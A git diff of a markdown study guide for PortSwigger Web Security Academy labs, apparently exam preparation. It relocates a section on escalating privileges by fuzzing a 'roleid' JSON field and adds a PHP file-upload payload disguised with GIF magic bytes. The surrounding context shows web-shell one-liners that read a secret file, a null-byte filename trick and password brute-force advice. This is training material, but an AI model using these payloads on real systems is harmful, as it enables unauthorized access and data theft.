@@ -965,48 +965,11 @@ X-Forwarded-For: 12.13.14.15
 
 ![Subtly invalid login](images/subtly-invalid-login.png)  
 
->Notice on the Intruder attack column for the GREP value, ```Invalid username or password.``` the one response message for a failed username attack do not contain full stop period at the end. Repeat the attack with this identified username, and **Sniper** attack the password field to ***identify*** 302 response for valid login.  
+>Notice on the Intruder attack column for the GREP value, ```Invalid username or password.``` the one response message for a failed username attack do not contain full stop period at the end. Repeat the attack with this identified username, and **Sniper** attack the password field to ***identify*** 302 response for valid login. In the exam ***lookout*** for other input field disclosing valid accounts on the application and brute force identified account passwords.  
 
 [PortSwigger Lab: Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)  
   
 # Privilege Escalation  
-  
-## PrivEsc JSON RoleId  
-
->Access control to the admin interface is based on user roles, and this can lead to privilege escalation or access control security vulnerability.  
-
->Capture current logged in user email change submission request and send to **Intruder**, then add ```"roleid":§99§``` into the JSON body of the request, and fuzz the possible roleid value for administrator access role.  
-
-```html
-POST /my-account/change-email HTTP/1.1
-Host: TARGET.web-security-academy.net
-Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
-Content-Length: 48
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
-Content-Type: text/plain;charset=UTF-8
-Connection: close
-
-{
- "email":"newemail@wiener.peter",
- "roleid": 42
-}
-```  
-
->The Hitchhiker's Guide to the Galaxy answer was [42](https://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker%27s_Guide_to_the_Galaxy#42_Puzzle)  
-
-![Intruder Payload set to identify Admin role ID](images/intruder-payload-positions.png)  
-
->Attacker ***identify*** the possible role ID of administrator role and then send this request with updated roleId to privilege escalate the current logged in user to the access role of administrator.  
-
-![Attack identify Admin role ID](images/admin-roleid-privesc.png)  
-
-[PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
-
->Escalation to administrator is sometimes controlled by a role selector GET request, by **dropping** this GET request before it is presented to the user, the default role of admin is selected and access granted to the admin portal.  
-
-![Select a role](images/select-a-role.png)  
-
-[PortSwigger Lab: Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)  
   
 ## CSRF Account Takeover  
 
@@ -1442,6 +1405,46 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
   
 ## Access Control  
   
+[PrivEsc JSON RoleId](#privesc-json-roleid)  
+[Original URL ](#original-url)  
+
+### PrivEsc JSON RoleId  
+
+>Access control to the admin interface is based on user roles, and this can lead to privilege escalation or access control security vulnerability.  
+
+>Capture current logged in user email change submission request and send to **Intruder**, then add ```"roleid":§99§``` into the JSON body of the request, and fuzz the possible roleid value for administrator access role.  
+
+```html
+POST /my-account/change-email HTTP/1.1
+Host: TARGET.web-security-academy.net
+Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
+Content-Length: 48
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Connection: close
+
+{
+ "email":"newemail@wiener.peter",
+ "roleid": 42
+}
+```  
+
+>The Hitchhiker's Guide to the Galaxy answer was [42](https://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker%27s_Guide_to_the_Galaxy#42_Puzzle)  
+
+![Intruder Payload set to identify Admin role ID](images/intruder-payload-positions.png)  
+
+>Attacker ***identify*** the possible role ID of administrator role and then send this request with updated roleId to privilege escalate the current logged in user to the access role of administrator.  
+
+![Attack identify Admin role ID](images/admin-roleid-privesc.png)  
+
+[PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
+
+>Escalation to administrator is sometimes controlled by a role selector GET request, by **dropping** this GET request before it is presented to the user, the default role of admin is selected and access granted to the admin portal.  
+
+![Select a role](images/select-a-role.png)  
+
+[PortSwigger Lab: Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)  
+
 ### Original URL  
 
 >Admin portal only accessible from internal. Identify if access control can be bypassed using header ```X-Original-URL```, observe different response to ```/admin``` endpoint requests depending on header value.  
@@ -2004,14 +2007,16 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```  
 
->File upload vulnerabilities bypass examples:  
+>File upload vulnerabilities bypass techniques:  
   
 1. Upload the file name and include obfuscated path traversal ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
 2. Upload a file named, ```exploit.php%00.jpg``` with trailing null character and get the file execution at ```/files/avatars/exploit.php```  
 3. Create polygot using valid image file, by running the command in bash terminal: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. Once polygot uploaded, view the extracted data by issue a GET request to the uploaded path ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain the sensitive data.  
 4. Upload two files, first ***.htaccess*** with content ```AddType application/x-httpd-php .l33t``` allowing then the upload and execute of second file named, ```exploit.l33t```  
+5. If target allow Remote File Include, upload from remote URL, then host and exploit file with the following GIF magic bytes: ```GIF89a; <?php echo file_get_contents('/home/carlos/secret'); ?>```. The file name on exploit server could read ```image.php%00.gif```.    
   
 >Matching file upload vulnerable labs:  
+  
 1. [PortSwigger Lab: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)  
 2. [PortSwigger Lab: Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)  
 3. [PortSwigger Lab: Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)  
